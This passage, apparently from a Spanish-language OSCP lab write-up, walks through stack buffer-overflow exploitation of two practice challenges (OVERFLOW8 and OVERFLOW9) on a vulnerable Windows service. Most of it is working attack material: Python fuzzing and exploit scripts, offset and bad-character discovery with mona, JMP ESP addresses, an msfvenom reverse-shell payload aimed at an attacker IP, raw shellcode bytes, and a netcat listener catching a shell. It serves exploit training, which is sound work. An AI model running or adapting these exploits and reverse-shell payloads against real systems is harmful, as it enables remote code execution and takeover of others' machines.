\u0026#34;\\xf8\\x0f\\x55\\x0f\\x8c\\x87\\x5a\\xb8\\x3b\\xfe\\x55\\x39\\x17\\xc2\\xf4\u0026#34; \u0026#34;\\xb9\\x6a\\x17\\xd6\\x80\\xa4\\x6a\\x17\\xc4\\xd9\\x87\\x45\\x9d\\x96\\x3a\u0026#34; \u0026#34;\\x79\\xaa\\xe3\\x86\\xf2\\xe0\\xe2\\x8e\\xe7\\xb1\\x05\\xbe\\xb6\\xca\\x5f\u0026#34; \u0026#34;\\x60\\x39\\x1e\\xd4\\x29\\x21\\x43\\xd1\\xe0\\xda\\xb7\\xad\\xf2\\x0a\\x86\u0026#34; \u0026#34;\\x4e\\x58\\x73\\x26\\xbd\\xa0\\xb4\\x81\\x5e\\xd7\\xcc\\xf1\\xe3\\xe0\\x0b\u0026#34; \u0026#34;\\x8b\\x3f\\x64\\x8f\\x2b\\xcb\\xde\\x6b\\xcd\\x18\\xb8\\xf8\\xc1\\xd5\\xce\u0026#34; \u0026#34;\\xa6\\xc5\\xe8\\x03\\xdd\\xf2\\x61\\xa2\\x31\\x73\\x31\\x81\\x95\\xdf\\xe1\u0026#34; \u0026#34;\\xa8\\x8c\\x85\\x44\\xd4\\xce\\x65\\x38\\x70\\x85\\x88\\x2d\\x09\\xc4\\xc4\u0026#34; \u0026#34;\\x82\\x20\\xf6\\x14\\x8d\\x33\\x85\\x26\\x12\\xe8\\x01\\x0b\\xdb\\x36\\xd6\u0026#34; \u0026#34;\\x6c\\xf6\\x8f\\x48\\x93\\xf9\\xef\\x41\\x50\\xad\\xbf\\xf9\\x71\\xce\\x2b\u0026#34; \u0026#34;\\xf9\\x7e\\x1b\\xfb\\xa9\\xd0\\xf4\\xbc\\x19\\x91\\xa4\\x54\\x73\\x1e\\x9a\u0026#34; \u0026#34;\\x45\\x7c\\xf4\\xb3\\xec\\x87\\x9f\\x7b\\x58\\x91\\x5e\\x14\\x9b\\x9d\\x65\u0026#34; \u0026#34;\\xde\\x12\\x7b\\x0f\\x0e\\x73\\xd4\\xb8\\xb7\\xde\\xae\\x59\\x37\\xf5\\xcb\u0026#34; \u0026#34;\\x5a\\xb3\\xfa\\x2c\\x14\\x34\\x76\\x3e\\xc1\\xb4\\xcd\\x1c\\x44\\xca\\xfb\u0026#34; \u0026#34;\\x08\\x0a\\x59\\x60\\xc8\\x45\\x42\\x3f\\x9f\\x02\\xb4\\x36\\x75\\xbf\\xef\u0026#34; \u0026#34;\\xe0\\x6b\\x42\\x69\\xca\\x2f\\x99\\x4a\\xd5\\xae\\x6c\\xf6\\xf1\\xa0\\xa8\u0026#34; \u0026#34;\\xf7\\xbd\\x94\\x64\\xae\\x6b\\x42\\xc3\\x18\\xda\\x3c\\x9d\\xf7\\xb4\\xa8\u0026#34; \u0026#34;\\x58\\x34\\x07\\xae\\x64\\x11\\xf1\\x4e\\xd4\\xcc\\x44\\x71\\xd9\\x98\\x40\u0026#34; \u0026#34;\\x0a\\x07\\x39\\xae\\xc1\\x83\\x59\\x4d\\xc3\\xf9\\xf1\\xc8\\x86\\x43\\x9c\u0026#34; \u0026#34;\\xea\\x7d\\x87\\x99\\x68\\x77\\x78\\x5e\\x70\\xf2\\x7d\\x1a\\x36\\xef\\x0f\u0026#34; \u0026#34;\\x33\\xd3\\x0f\\xa3\\x34\\xf6\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501203) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1786 + eip_ret + nops + shellcode + padding * (2220 - 1786 - 4 - 16 - 351) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW8 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ OVERFLOW_8 nc -lnvp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49164 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 9 Fuzzing Realizamos fuzzing al segundo reto utilizando esta vez OVERFLOW9.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW9 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Encontramos que el programa se detuvo con 1700 bytes.\n1 2 3 4 ➜ OVERFLOW_9 ./overflow9.py 192.168.22.128 [∧] Progreso: Enviando 1700 bytes. [-] Parece que el programa se detuvo con 1700 bytes. ➜ OVERFLOW_9 Observamos que el registro EIP se sobreescribió con “A\u0026quot;s, tambien vemos el registro ESP con los mismos valores.\nOffset EIP Creamos un patron de 1900 bytes utilizando pattern_create.rb.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 1900 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2C Modificamos el script para realizar el envio de este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2C\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW9 %s\\r\\n\u0026#34; % buff) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34;) El registro EIP está lleno con el patron enviado asi mismo el registro ESP.\nMona nos muestra el offset con valor de 1514 bytes.\n1 2 3 4 5 6 7 8 9 # !mona findmsp -distance 1900 [+] Command used: !mona findmsp -distance 1900 [..] [+] Examining registers EIP contains normal pattern : 0x35794234 (offset 1514) ESP (0x0177fa30) points at offset 1518 in normal pattern (length 382) EBP contains normal pattern : 0x79423379 (offset 1510) EBX contains normal pattern : 0x42327942 (offset 1506) Control EIP Utilizando la longitud del offset agregamos “B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (1900).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1514 + eip_ret + nops + padding * (1900-1514-4) # junk 1514, eip 4, padding 382 = 1900 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW9 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script vemos que el registro EIP contiene “B\u0026quot;s lo que significa que el offset es exacto, además vemos el registro ESP con el padding (“C\u0026quot;s).\nEspacio - Shellcode Aumentamos el padding para tener asegurado un espacio ‘decente’ para nuestro shellcode, en este caso 120 bytes adicionales, en total tendríamos 502 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1514 + eip_ret + nops + padding * (1900-1514-4+120) # 502 padding # 1514 junk, 4 eip_ret, padding 502 (shellcode + nops) # total buffer = 2020 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW9 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 2020 bytes de los cuales 502 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos el script con nuestro array de badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1514 + eip_ret + nops + badchars + padding * (2020 - 1514 - 4 - 255) # 255 badchars try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW9 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\x04\\x3e\\x3f\\xe1\u0026quot;.\n1 \\x00\\x04\\x3e\\x3f\\xe1 JMP ESP Buscamos una instrucción de salto al ESP con mona.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x04\\x3e\\x3f\\xe1\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\x04\\x3e\\x3f\\xe1\u0026#34; Encontramos dos direcciones de memoria con la instrucción jmp esp sin ningun tipo de protección.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Log data [+] Command used: !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x04\\x3e\\x3f\\xe1\u0026#34; [+] Results : 0x625011af : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011c7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x7ffe02e3 : \u0026#39;jmp esp\u0026#39; | {PAGE_READONLY} Found a total of 10 pointers Modificamos nuestr script agregando la dirección de la instrucción.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x625011d3) Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\x04\\x3e\\x3f\\xe1\u0026#34; Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of c file: 1500 bytes unsigned char buf[] = \u0026#34;\\xbf\\xad\\xc1\\x09\\x76\\xdb\\xd3\\xd9\\x74\\x24\\xf4\\x5b\\x33\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x31\\x7b\\x12\\x83\\xeb\\xfc\\x03\\xd6\\xcf\\xeb\\x83\\xd4\\x38\\x69\u0026#34; \u0026#34;\\x6b\\x24\\xb9\\x0e\\xe5\\xc1\\x88\\x0e\\x91\\x82\\xbb\\xbe\\xd1\\xc6\\x37\u0026#34; \u0026#34;\\x34\\xb7\\xf2\\xcc\\x38\\x10\\xf5\\x65\\xf6\\x46\\x38\\x75\\xab\\xbb\\x5b\u0026#34; \u0026#34;\\xf5\\xb6\\xef\\xbb\\xc4\\x78\\xe2\\xba\\x01\\x64\\x0f\\xee\\xda\\xe2\\xa2\u0026#34; \u0026#34;\\x1e\\x6e\\xbe\\x7e\\x95\\x3c\\x2e\\x07\\x4a\\xf4\\x51\\x26\\xdd\\x8e\\x0b\u0026#34; \u0026#34;\\xe8\\xdc\\x43\\x20\\xa1\\xc6\\x80\\x0d\\x7b\\x7d\\x72\\xf9\\x7a\\x57\\x4a\u0026#34; \u0026#34;\\x02\\xd0\\x96\\x62\\xf1\\x28\\xdf\\x45\\xea\\x5e\\x29\\xb6\\x97\\x58\\xee\u0026#34; \u0026#34;\\xc4\\x43\\xec\\xf4\\x6f\\x07\\x56\\xd0\\x8e\\xc4\\x01\\x93\\x9d\\xa1\\x46\u0026#34; \u0026#34;\\xfb\\x81\\x34\\x8a\\x70\\xbd\\xbd\\x2d\\x56\\x37\\x85\\x09\\x72\\x13\\x5d\u0026#34; \u0026#34;\\x33\\x23\\xf9\\x30\\x4c\\x33\\xa2\\xed\\xe8\\x38\\x4f\\xf9\\x80\\x63\\x18\u0026#34; \u0026#34;\\xce\\xa8\\x9b\\xd8\\x58\\xba\\xe8\\xea\\xc7\\x10\\x66\\x47\\x8f\\xbe\\x71\u0026#34; \u0026#34;\\xa8\\xba\\x07\\xed\\x57\\x45\\x78\\x24\\x9c\\x11\\x28\\x5e\\x35\\x1a\\xa3\u0026#34; \u0026#34;\\x9e\\xba\\xcf\\x64\\xce\\x14\\xa0\\xc4\\xbe\\xd4\\x10\\xad\\xd4\\xda\\x4f\u0026#34; \u0026#34;\\xcd\\xd7\\x30\\xf8\\x64\\x22\\xd3\\xc7\\xd1\\x3a\\x22\\xa0\\x23\\x42\\x21\u0026#34; \u0026#34;\\x0a\\xad\\xa4\\x43\\x7a\\xfb\\x7f\\xfc\\xe3\\xa6\\x0b\\x9d\\xec\\x7c\\x76\u0026#34; \u0026#34;\\x9d\\x67\\x73\\x87\\x50\\x80\\xfe\\x9b\\x05\\x60\\xb5\\xc1\\x80\\x7f\\x63\u0026#34; \u0026#34;\\x6d\\x4e\\xed\\xe8\\x6d\\x19\\x0e\\xa7\\x3a\\x4e\\xe0\\xbe\\xae\\x62\\x5b\u0026#34; \u0026#34;\\x69\\xcc\\x7e\\x3d\\x52\\x54\\xa5\\xfe\\x5d\\x55\\x28\\xba\\x79\\x45\\xf4\u0026#34; \u0026#34;\\x43\\xc6\\x31\\xa8\\x15\\x90\\xef\\x0e\\xcc\\x52\\x59\\xd9\\xa3\\x3c\\x0d\u0026#34; 